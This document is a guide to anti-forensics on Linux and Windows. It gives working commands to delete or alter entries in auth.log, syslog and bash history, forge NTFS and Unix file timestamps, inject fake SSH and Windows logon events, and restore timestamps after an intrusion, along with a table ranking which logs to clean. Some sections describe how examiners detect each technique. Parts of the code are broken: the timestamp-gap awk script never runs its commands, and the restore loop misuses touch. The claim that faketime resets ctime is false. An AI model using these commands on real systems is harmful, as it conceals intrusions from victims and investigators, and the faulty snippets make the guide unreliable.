# Log Tampering and Timestamp Manipulation Guide

## Introduction

Log files and file timestamps are the backbone of forensic timeline analysis. When an incident response team reconstructs an attack, they rely on log entries (authentication events, process creation, network connections) and file MAC timestamps (Modified, Accessed, Created) to build a chronological narrative. Anti-forensic techniques that target these data sources aim to break that narrative -- either by removing evidence entirely or by introducing false timestamps that mislead investigators.

This guide covers log file manipulation with logtamper, timestamp forging with timestomp and touch, event log injection techniques, and the forensic artifacts that these techniques leave behind. Understanding both the offensive techniques and their detectable artifacts is essential for realistic penetration testing and effective defensive monitoring.

---

## 1. Log Tampering with logtamper

### How logtamper Works

logtamper operates on text-based log files (auth.log, syslog, Apache access.log, etc.) by parsing each line and selectively removing or modifying entries that match specified criteria. It can filter by IP address, username, timestamp range, or any combination thereof. The tool rewrites the log file in place, preserving the format of remaining entries.

```bash
# Remove all entries containing a specific IP address
logtamper -f /var/log/auth.log -r "192.168.1.100"

# Remove entries for a specific username
logtamper -f /var/log/auth.log -r "attacker_user"

# Remove entries within a specific time window
logtamper -f /var/log/auth.log -t "2026-05-15 10:00:00" -T "2026-05-15 14:30:00"

# Replace attacker IP with a decoy IP throughout the log
logtamper -f /var/log/auth.log -s "192.168.1.100" -d "10.0.0.50"
```

### Target Log Files

A comprehensive log cleanup should address all log files that may have recorded engagement activity:

| Log File | Contents | Priority |
|----------|----------|----------|
| `/var/log/auth.log` | SSH logins, sudo usage, authentication events | CRITICAL |
| `/var/log/syslog` | General system messages, service events | CRITICAL |
| `/var/log/kern.log` | Kernel messages, module loading | HIGH |
| `/var/log/apache2/access.log` | Web server requests | HIGH (if web attack) |
| `/var/log/nginx/access.log` | Web server requests | HIGH (if web attack) |
| `/var/log/audit/audit.log` | SELinux audit trail | HIGH |
| `~/.bash_history` | Command history for specific users | CRITICAL |
| `/var/log/wtmp` | Login records (binary format) | HIGH |
| `/var/log/btmp` | Failed login attempts (binary format) | MEDIUM |
| `/var/log/mail.log` | Email server logs | LOW (if relevant) |

### Forensic Artifacts Left by logtamper

Even after successful log cleaning, several artifacts may reveal that tampering occurred:

1. **Timestamp gaps**: If log entries are dense (multiple entries per minute) and a block of entries is removed, the resulting gap is detectable by automated timeline analysis tools. The gap creates a suspicious silence that correlates with the engagement time window.

2. **Line count discrepancy**: If the system maintains log rotation files (auth.log.1, auth.log.2.gz), the cleaned auth.log will have fewer lines than the compressed rotation files would predict. This mathematical inconsistency is a red flag for forensic examiners.

3. **File modification time**: The log file's mtime will reflect the time of tampering, not the last legitimate log entry. If the last entry in auth.log has a timestamp of 14:30 but the file's mtime shows 15:45, an examiner knows the file was modified after the last recorded event.

4. **Inode change time (ctime)**: On ext4, the ctime updates when the file is modified. A ctime that does not correspond to any log entry timestamp is suspicious.

```bash
# Check for these artifacts on the cleaned system:
# 1. Timestamp gaps
awk 'NR>1 {
  cmd="date -d \""$1" "$2" "$3"\" +%s 2>/dev/null"
  cmd2="date -d \""$1" "$2" prev_ts"\" +%s 2>/dev/null"
}' /var/log/auth.log

# 2. File modification time vs last entry
echo "File mtime:"; stat /var/log/auth.log | grep Modify
echo "Last log entry:"; tail -1 /var/log/auth.log

# 3. Line count comparison
wc -l /var/log/auth.log
zcat /var/log/auth.log.2.gz | wc -l
```

---

## 2. Timestamp Manipulation

### NTFS Timestamp Forging with timestomp

NTFS stores four timestamps for each file (known as MACE timestamps):

- **M**odified: When the file's data was last written
- **A**ccessed: When the file was last read
- **C**reated: When the file was created (MFT entry created)
- **E**ntry Modified: When the file's MFT entry was last modified

timestomp (available in Metasploit's Meterpreter) modifies the $STANDARD_INFORMATION attribute, which stores the MACE timestamps that most applications and tools read. However, NTFS also stores a separate set of timestamps in the $FILE_NAME attribute within the directory index. These $FILE_NAME timestamps are maintained by the NTFS driver and are significantly harder to tamper with.

```bash
# In Meterpreter session on Windows target:

# View current MACE timestamps
timestomp C:\temp\payload.exe -v

# Set all four timestamps simultaneously
timestomp C:\temp\payload.exe -z "01/01/2024 08:30:00"

# Copy timestamps from a legitimate file (most realistic approach)
timestomp C:\temp\malicious.dll -f C:\Windows\System32\ntdll.dll

# Set individual timestamps for finer control
timestomp C:\temp\payload.exe -m "03/15/2025 14:22:17"   # Modified
timestomp C:\temp\payload.exe -a "03/15/2025 14:22:17"   # Accessed
timestomp C:\temp\payload.exe -c "03/15/2025 14:22:17"   # Created
timestomp C:\temp\payload.exe -e "03/15/2025 14:22:17"   # Entry Modified
```

### Detection: $STANDARD_INFORMATION vs $FILE_NAME Discrepancy

Forensic examiners detect timestomp by comparing the two timestamp sources:

```bash
# Using analyzeMFT to extract both timestamp sets
analyzeMFT.py -f \$MFT -o mft_output.csv

# Find entries where STANDARD_INFORMATION created time differs from FILENAME created time
awk -F',' 'NR>1 && $4 != $6 {print "SUSPICIOUS: Entry "$1" SI_Created="$4" FN_Created="$6}' mft_output.csv

# Normal files: both timestamps match (or FILENAME is slightly earlier)
# Timestomped files: $STANDARD_INFORMATION shows forged time, $FILE_NAME shows real time
```

This is the primary detection method and the reason why naive timestomp is considered only moderately effective against skilled forensic examiners. A more sophisticated approach would need to modify both attributes, which requires low-level NTFS manipulation or a custom kernel driver.

### Unix Timestamp Manipulation with touch

On Linux systems, the `touch` command can modify atime and mtime. However, ctime (change time) is maintained by the kernel and cannot be directly set by userspace tools. This makes ctime a reliable forensic indicator.

```bash
# Set both atime and mtime
touch -t 202401010830 /tmp/secret_file.txt

# Set only atime (access time)
touch -a -t 202401010830 /tmp/secret_file.txt

# Set only mtime (modification time)
touch -m -t 202401010830 /tmp/secret_file.txt

# Copy timestamps from a legitimate file
touch -r /etc/hostname /tmp/malicious_script.sh

# Workaround for ctime: use faketime to manipulate system clock perception
faketime '2024-01-01 08:30:00' touch /tmp/secret_file.txt

# Verify: stat shows all three timestamps
stat /tmp/secret_file.txt
# Note: ctime will show the actual time of the touch command unless faketime was used
```

---

## 3. Event Log Injection

Beyond removing entries, attackers may inject fake log entries to create false narratives or cover their tracks with decoy activity.

```bash
# Inject fake SSH login entries to normalize attacker access
logger -t sshd "Accepted password for admin from 10.0.0.5 port 22 ssh2"
logger -t sshd "Accepted publickey for admin from 10.0.0.5 port 22 ssh2"

# Inject fake cron entries to explain file modifications
logger -t CRON "(root) CMD (systemctl reload nginx)"

# Inject fake service restart events
logger -t systemd "Started nginx.service - A high performance web server."

# Windows: inject events using PowerShell
# PowerShell Event Log injection:
Write-EventLog -LogName Security -Source Microsoft-Windows-Security-Auditing -EntryType SuccessAudit -EventId 4624 -Message "An account was successfully logged on."
```

### Detection of Injected Events

Injected events often have subtle inconsistencies:

- **Process ID mismatch**: The PID in the injected entry may not correspond to any running process at that timestamp.
- **Session ID patterns**: Real SSH login sessions have sequential session IDs; injected entries may break this sequence.
- **Missing correlated events**: A real SSH login generates multiple events (session opened, pam_unix authentication, user env setup). A single injected entry without the correlated events is suspicious.

---

## 4. Defeating Timeline Analysis

### Defense-in-Depth Against Timeline Reconstruction

Skilled forensic examiners build timelines from multiple independent sources:

1. **Filesystem MAC timestamps** (fls/mactime)
2. **Log file entries** (auth.log, syslog, Event Log)
3. **Network traffic timestamps** (PCAP frame times)
4. **Memory process creation times** (Volatility pslist)
5. **Registry timestamps** (Windows ShimCache, UserAssist)

To defeat comprehensive timeline analysis, the anti-forensic cleanup must be consistent across all these sources. Removing auth.log entries but leaving matching PCAP evidence creates an inconsistency that actually strengthens the forensic case. The most effective approach is to minimize the number of distinct artifacts created during the engagement, reducing the cleanup surface from the start.

```bash
# Pre-engagement baseline capture (for later restoration)
# Capture file timestamps of target directories
find /etc /var/log -type f -exec stat --format="%n %Y %Z" {} \; > /tmp/baseline_timestamps.txt

# Capture log file hashes and line counts
for f in /var/log/*.log; do
  echo "$(sha256sum $f | awk '{print $1}') $(wc -l < $f) $f"
done > /tmp/baseline_logs.txt

# Post-engagement: restore timestamps from baseline
while IFS=' ' read -r path mtime ctime; do
  touch -d "$(date -d @$mtime '+%Y%m%d%H%M.%S')" "$path" 2>/dev/null
done < /tmp/baseline_timestamps.txt
```

---

## References

- **logtamper**: Available in Kali Linux repositories -- log file manipulation tool for Unix systems
- **timestomp (Metasploit)**: https://docs.metasploit.com/ -- Meterpreter post-exploitation module for NTFS timestamp manipulation
- **analyzeMFT**: https://github.com/dkovar/analyzeMFT -- MFT analysis tool for detecting timestamp discrepancies between $STANDARD_INFORMATION and $FILE_NAME attributes
- **SANS Timeline Analysis**: https://www.sans.org/white-papers/timeline-analysis/ -- SANS Institute research on forensic timeline reconstruction techniques
- **NTFS Timestamps Deep Dive**: https://docs.microsoft.com/en-us/windows/win32/fileio/file-times -- Microsoft documentation on NTFS timestamp behavior and attribution
